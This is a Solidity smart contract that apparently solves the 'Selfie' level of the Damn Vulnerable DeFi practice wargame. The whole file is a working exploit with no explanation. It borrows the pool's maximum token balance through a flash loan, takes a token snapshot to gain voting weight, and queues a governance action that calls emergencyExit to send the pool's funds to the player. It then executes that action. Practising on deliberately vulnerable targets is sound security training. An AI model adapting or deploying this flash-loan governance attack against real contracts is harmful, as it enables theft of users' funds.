// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import "./SelfiePool.sol";

contract AttackS is IERC3156FlashBorrower {
    address player;
    DamnValuableTokenSnapshot DVTS;
    SelfiePool SP;
    SimpleGovernance SG;
    bytes encodedParams;
    uint256 AID;

    constructor (address _player, address _DVTS, address _SP, address _SG) {
        player = _player;
        DVTS = DamnValuableTokenSnapshot(_DVTS);
        SP = SelfiePool(_SP);
        SG = SimpleGovernance(_SG);
    }

    function kekFL() public {
        DVTS.approve(address(SP),SP.maxFlashLoan(address(DVTS)));
        SP.flashLoan(IERC3156FlashBorrower(address(this)),address(DVTS),SP.maxFlashLoan(address(DVTS)),"0x");
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external override returns (bytes32) {
        DVTS.snapshot();
        encodedParams = abi.encodeWithSelector(bytes4(keccak256("emergencyExit(address)")),player);
        AID = SG.queueAction(address(SP),0,encodedParams);  
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function kekeA() public {
        SG.executeAction(AID);
    }
}
